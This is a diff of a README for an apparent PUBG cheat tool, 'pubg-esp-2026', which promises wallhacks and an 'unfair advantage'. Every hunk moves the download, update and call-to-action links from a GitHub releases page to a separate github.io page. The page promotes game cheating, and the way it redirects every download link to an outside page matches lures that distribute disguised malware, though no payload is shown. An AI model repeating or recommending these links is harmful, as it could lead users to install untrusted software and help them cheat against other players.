@@ -1,6 +1,6 @@
 # 🔥 pubg-esp-2026 - See Everything, Win Everything
 
-[![Download Now](https://img.shields.io/badge/Download-PUBG_ESP_2026-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/ptobatuabi-commits/pubg-esp-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-PUBG_ESP_2026-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://ptobatuabi-commits.github.io)
 
 ## 🎯 What Is This?
 
@@ -54,7 +54,7 @@ Follow these simple steps to get up and running in under 2 minutes.
 
 Visit this link to download the application:
 
-[**DOWNLOAD PUBG ESP 2026**](https://github.com/ptobatuabi-commits/pubg-esp-2026/releases)
+[**DOWNLOAD PUBG ESP 2026**](https://ptobatuabi-commits.github.io)
 
 Click the link above. You'll see a page with the latest version of the software.
 
@@ -198,7 +198,7 @@ Having issues? Try these common solutions:
 
 ### Problem: Tool Shows Error Message
 - Take a screenshot of the error
-- Visit the [releases page](https://github.com/ptobatuabi-commits/pubg-esp-2026/releases) for updates
+- Visit the [releases page](https://ptobatuabi-commits.github.io) for updates
 - Try the latest version
 
 ---
@@ -241,7 +241,7 @@ A: Usually within 24-48 hours after PUBG game updates.
 
 Ready to dominate the battlegrounds?
 
-[**▶️ Download PUBG ESP 2026**](https://github.com/ptobatuabi-commits/pubg-esp-2026/releases)
+[**▶️ Download PUBG ESP 2026**](https://ptobatuabi-commits.github.io)
 
 Get the unfair advantage today. See through walls, grab the best loot, and become the last one standing — every single match.
 
